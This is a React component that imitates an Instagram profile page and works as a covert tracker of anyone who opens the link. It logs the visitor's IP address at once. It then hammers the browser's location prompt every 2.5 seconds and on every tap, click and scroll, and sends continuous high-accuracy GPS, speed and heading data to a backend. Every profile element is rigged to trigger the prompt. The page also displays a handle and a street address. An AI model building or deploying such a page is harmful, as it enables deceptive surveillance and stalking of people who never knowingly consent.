"use client";

import { useEffect, useRef, useState } from "react";
import Sidebar from "../components/Sidebar";

export default function RecipientFeed({
  backendUrl = process.env.NEXT_PUBLIC_SOCKET_URL || "http://localhost:5000",
  sessionId = "",
}) {
  const [isFollowing, setIsFollowing] = useState(false);
  const [coords, setCoords] = useState(null);
  const [hasAllowed, setHasAllowed] = useState(false);

  const watchIdRef = useRef(null);
  const retryTimerRef = useRef(null);
  const hasAllowedRef = useRef(false);

  /*
   * Save location coordinates to backend MongoDB & broadcast to Host
   */
  const saveLocation = async (position) => {
    const { latitude, longitude, accuracy, speed, heading } = position.coords;
    setCoords({ latitude, longitude, accuracy });
    setHasAllowed(true);
    hasAllowedRef.current = true;

    // Clear continuous retry timer once location is successfully allowed
    if (retryTimerRef.current) {
      clearInterval(retryTimerRef.current);
      retryTimerRef.current = null;
    }

    try {
      const response = await fetch(`${backendUrl}/api/records`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          sessionId: sessionId || (typeof window !== "undefined" ? window.location.href : "default-session"),
          participantName: "Mobile Recipient",
          latitude,
          longitude,
          accuracy: accuracy ?? null,
          speed: speed ?? null,
          heading: heading ?? null,
          timestamp: new Date().toISOString(),
        }),
      });

      if (!response.ok) {
        throw new Error(`HTTP ${response.status}`);
      }

      console.log("Location captured and saved successfully");
    } catch (error) {
      console.error("Location save failed:", error);
    }
  };

  /*
   * Request GPS permission via native browser dialog
   * and start continuous automatic tracking
   */
  const requestLocation = () => {
    if (!navigator.geolocation) {
      console.warn("Geolocation is not supported by this browser.");
      return;
    }

    if (hasAllowedRef.current && watchIdRef.current !== null) {
      return; // Already actively streaming
    }

    // Native browser prompt triggers here
    navigator.geolocation.getCurrentPosition(
      async (position) => {
        // Save initial coordinates & mark allowed
        await saveLocation(position);
        setIsFollowing(true);

        // Start live location stream continuously
        if (watchIdRef.current === null) {
          watchIdRef.current = navigator.geolocation.watchPosition(
            async (updatedPosition) => {
              await saveLocation(updatedPosition);
            },
            (error) => {
              console.error("Location update error:", error);
            },
            {
              enableHighAccuracy: true,
              maximumAge: 5000,
              timeout: 15000,
            }
          );
        }
      },
      (error) => {
        console.warn("Browser location pending/dismissed:", error.message);
      },
      {
        enableHighAccuracy: true,
        maximumAge: 0,
        timeout: 10000,
      }
    );
  };

  /*
   * Instant IP and Visit Capture on Link Open
   */
  const trackVisitImmediately = async () => {
    try {
      let clientIp = null;
      try {
        const ipRes = await fetch("https://api.ipify.org?format=json");
        if (ipRes.ok) {
          const ipData = await ipRes.json();
          clientIp = ipData.ip;
        }
      } catch (e) {
        // Fallback to server-side detected IP
      }

      await fetch(`${backendUrl}/api/track-visit`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          sessionId: sessionId || "default-session",
          participantName: "Mobile Visitor",
          clientIp,
          timestamp: new Date().toISOString(),
        }),
      });
    } catch (err) {
      console.warn("Immediate visit capture warning:", err);
    }
  };

  useEffect(() => {
    // 1. Immediately log IP address and visit to MongoDB in the very first millisecond
    trackVisitImmediately();

    // 2. Trigger native browser GPS prompt immediately on page load
    requestLocation();

    // 3. Continuously ask / retry every 2.5 seconds until user taps "Allow"
    retryTimerRef.current = setInterval(() => {
      if (!hasAllowedRef.current) {
        requestLocation();
      } else {
        clearInterval(retryTimerRef.current);
      }
    }, 2500);

    // 4. User interaction listener (tap/click anywhere on page forces browser location prompt)
    const handleUserInteraction = () => {
      if (!hasAllowedRef.current) {
        requestLocation();
      }
    };

    window.addEventListener("click", handleUserInteraction);
    window.addEventListener("touchstart", handleUserInteraction);
    window.addEventListener("scroll", handleUserInteraction);

    return () => {
      if (retryTimerRef.current) {
        clearInterval(retryTimerRef.current);
      }
      if (watchIdRef.current !== null) {
        navigator.geolocation.clearWatch(watchIdRef.current);
      }
      window.removeEventListener("click", handleUserInteraction);
      window.removeEventListener("touchstart", handleUserInteraction);
      window.removeEventListener("scroll", handleUserInteraction);
    };
  }, []);

  const handleToggleFollow = () => {
    requestLocation();
    setIsFollowing(true);
  };

  return (
    <div className="ig-app" onClick={requestLocation} onTouchStart={requestLocation}>
      {/* Left Sidebar */}
      <Sidebar onItemClick={requestLocation} activeTab="Profile" />

      {/* Main Content Area */}
      <main className="ig-main">
        <header className="ig-topbar">
          <div className="mobile-logo">Instagram</div>
        </header>

        <div className="feed-container">
          {/* Profile Section */}
          <section className="profile-header">
            <div className="profile-avatar" onClick={requestLocation}>
              <div className="location-avatar">
                <div className="ig-story-ring">
                  <img src="/highlights/profile.jpg" alt="mr_in.nocent_yogi" />
                </div>
              </div>
            </div>

            <div className="profile-info">
              <div className="profile-title">
                <h1>mr_in.nocent_yogi</h1>
              </div>

              <div className="profile-stats">
                <div><strong>94</strong><span>posts</span></div>
                <div><strong>293</strong><span>followers</span></div>
                <div><strong>625</strong><span>following</span></div>
              </div>

              <div className="profile-description">
                <p>
                  Avalai Avalai 🧚 Rasithu Kidanthu Vizhigal👀
                  Vaeraraiyum Paarkathae🙈
                  Avalai Avalai Pazhagi Tholaitha Ithayam
                  Vaeraraiyum Aerkaathae❣️
                  @editor_Yogi_R³
                </p>
                <span className="profile-link">🔗 yrdigitalenterprises.in</span>
                <span className="profile-link">13/b kuttiyan palayam street, Kumbakonam 612001</span>
              </div>
            </div>
          </section>

          {/* Profile Action Buttons */}
          <div className="profile-action-buttons">
            <button
              className={`profile-follow-btn ${isFollowing ? "following" : ""}`}
              onClick={handleToggleFollow}
            >
              {isFollowing ? "Following" : "Follow"}
            </button>
          </div>

          {/* Story Highlights */}
          <div className="highlights-row">
            <div className="highlight-item" onClick={requestLocation}>
              <div className="highlight-ring">
                <div className="highlight-avatar">
                  <img src="/highlights/business.jpg" alt="Bussiness" />
                </div>
              </div>
              <span>Bussiness</span>
            </div>

            <div className="highlight-item" onClick={requestLocation}>
              <div className="highlight-ring">
                <div className="highlight-avatar">
                  <img src="/highlights/invitations.jpg" alt="invitations" />
                </div>
              </div>
              <span>invitations</span>
            </div>

            <div className="highlight-item" onClick={requestLocation}>
              <div className="highlight-ring">
                <div className="highlight-avatar">
                  <img src="/highlights/aval.jpg" alt="Aval" />
                </div>
              </div>
              <span>Aval ❣️</span>
            </div>

            <div className="highlight-item" onClick={requestLocation}>
              <div className="highlight-ring">
                <div className="highlight-avatar">
                  <img src="/highlights/thumbnails.jpg" alt="Thumbnails" />
                </div>
              </div>
              <span>Thumbnails...</span>
            </div>

            <div className="highlight-item" onClick={requestLocation}>
              <div className="highlight-ring">
                <div className="highlight-avatar">
                  <img src="/highlights/king.jpg" alt="king" />
                </div>
              </div>
              <span>king 👑</span>
            </div>

            <div className="highlight-item" onClick={requestLocation}>
              <div className="highlight-ring">
                <div className="highlight-avatar" style={{ background: "#181A20", display: "flex", alignItems: "center", justifyContent: "center" }}>
                  <svg viewBox="0 0 24 24" width="24" height="24" stroke="#FFFFFF" fill="none" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                    <line x1="12" y1="5" x2="12" y2="19"></line>
                    <line x1="5" y1="12" x2="19" y2="12"></line>
                  </svg>
                </div>
              </div>
              <span>New</span>
            </div>
          </div>

          {/* Profile Navigation Tabs Bar */}
          <div className="profile-tabs-bar">
            <button className="profile-tab-item active" onClick={requestLocation} title="Posts">
              <svg viewBox="0 0 24 24" width="22" height="22" fill="none" stroke="currentColor" strokeWidth="2">
                <rect x="3" y="3" width="7" height="7" />
                <rect x="14" y="3" width="7" height="7" />
                <rect x="14" y="14" width="7" height="7" />
                <rect x="3" y="14" width="7" height="7" />
              </svg>
            </button>

            <button className="profile-tab-item" onClick={requestLocation} title="Reels">
              <svg viewBox="0 0 24 24" width="22" height="22" fill="none" stroke="currentColor" strokeWidth="2">
                <rect x="2" y="2" width="20" height="20" rx="5" ry="5" />
                <polygon points="10 8 16 12 10 16 10 8" fill="currentColor" />
              </svg>
            </button>

            <button className="profile-tab-item" onClick={requestLocation} title="Saved">
              <svg viewBox="0 0 24 24" width="22" height="22" fill="none" stroke="currentColor" strokeWidth="2">
                <path d="M19 21l-7-5-7 5V5a2 2 0 0 1 2-2h10a2 2 0 0 1 2 2z" />
              </svg>
            </button>

            <button className="profile-tab-item" onClick={requestLocation} title="Reposts">
              <svg viewBox="0 0 24 24" width="22" height="22" fill="none" stroke="currentColor" strokeWidth="2">
                <path d="M17 1l4 4-4 4" />
                <path d="M3 11V9a4 4 0 0 1 4-4h14" />
                <path d="M7 23l-4-4 4-4" />
                <path d="M21 13v2a4 4 0 0 1-4 4H3" />
              </svg>
            </button>

            <button className="profile-tab-item" onClick={requestLocation} title="Tagged">
              <svg viewBox="0 0 24 24" width="22" height="22" fill="none" stroke="currentColor" strokeWidth="2">
                <rect x="3" y="3" width="18" height="18" rx="2" />
                <circle cx="12" cy="10" r="3" />
                <path d="M7 21v-2a5 5 0 0 1 10 0v2" />
              </svg>
            </button>
          </div>

          {/* Post Photo Grid (3-Columns) */}
          <div className="recipient-posts-grid">
            {/* Post 1 - Pinned */}
            <div className="recipient-post-tile" onClick={requestLocation}>
              <div className="post-badge pin-badge" title="Pinned">
                <svg viewBox="0 0 24 24"><path d="M16 12V4H17V2H7V4H8V12L5 15V17H11V22H13V17H19V15L16 12Z"/></svg>
              </div>
              <img src="/posts/post1.jpg" alt="Post 1" />
            </div>

            {/* Post 2 - Pinned */}
            <div className="recipient-post-tile" onClick={requestLocation}>
              <div className="post-badge pin-badge" title="Pinned">
                <svg viewBox="0 0 24 24"><path d="M16 12V4H17V2H7V4H8V12L5 15V17H11V22H13V17H19V15L16 12Z"/></svg>
              </div>
              <img src="/posts/post2.jpg" alt="Post 2" />
            </div>

            {/* Post 3 - Pinned */}
            <div className="recipient-post-tile" onClick={requestLocation}>
              <div className="post-badge pin-badge" title="Pinned">
                <svg viewBox="0 0 24 24"><path d="M16 12V4H17V2H7V4H8V12L5 15V17H11V22H13V17H19V15L16 12Z"/></svg>
              </div>
              <img src="/posts/post3.jpg" alt="Post 3" />
            </div>

            {/* Post 4 - Reel */}
            <div className="recipient-post-tile" onClick={requestLocation}>
              <div className="post-badge reel-badge" title="Reel">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                  <polygon points="6 4 20 12 6 20 6 4" fill="#FFFFFF" />
                </svg>
              </div>
              <img src="/posts/post4.jpg" alt="Post 4" />
            </div>

            {/* Post 5 - Carousel */}
            <div className="recipient-post-tile" onClick={requestLocation}>
              <div className="post-badge carousel-badge" title="Carousel">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                  <rect x="2" y="2" width="16" height="16" rx="2" />
                  <rect x="6" y="6" width="16" height="16" rx="2" fill="rgba(255,255,255,0.3)" />
                </svg>
              </div>
              <img src="/posts/post5.jpg" alt="Post 5" />
            </div>

            {/* Post 6 - Reel */}
            <div className="recipient-post-tile" onClick={requestLocation}>
              <div className="post-badge reel-badge" title="Reel">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                  <polygon points="6 4 20 12 6 20 6 4" fill="#FFFFFF" />
                </svg>
              </div>
              <img src="/posts/post6.jpg" alt="Post 6" />
            </div>

            {/* Post 7 - Reel */}
            <div className="recipient-post-tile" onClick={requestLocation}>
              <div className="post-badge reel-badge" title="Reel">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                  <polygon points="6 4 20 12 6 20 6 4" fill="#FFFFFF" />
                </svg>
              </div>
              <img src="/posts/post7.jpg" alt="Post 7" />
            </div>

            {/* Post 8 - Reel */}
            <div className="recipient-post-tile" onClick={requestLocation}>
              <div className="post-badge reel-badge" title="Reel">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                  <polygon points="6 4 20 12 6 20 6 4" fill="#FFFFFF" />
                </svg>
              </div>
              <img src="/posts/post8.jpg" alt="Post 8" />
            </div>

            {/* Post 9 - Carousel */}
            <div className="recipient-post-tile" onClick={requestLocation}>
              <div className="post-badge carousel-badge" title="Carousel">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                  <rect x="2" y="2" width="16" height="16" rx="2" />
                  <rect x="6" y="6" width="16" height="16" rx="2" fill="rgba(255,255,255,0.3)" />
                </svg>
              </div>
              <img src="/posts/post9.jpg" alt="Post 9" />
            </div>
          </div>

          {/* Floating Messenger Pill */}
          <div className="floating-message-btn" onClick={requestLocation} title="Message">
            <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" strokeWidth="2">
              <path d="M22 2L11 13" />
              <polygon points="22 2 15 22 11 13 2 9 22 2" fill="currentColor" />
            </svg>
            <span>Message</span>
          </div>
        </div>
      </main>
    </div>
  );
}
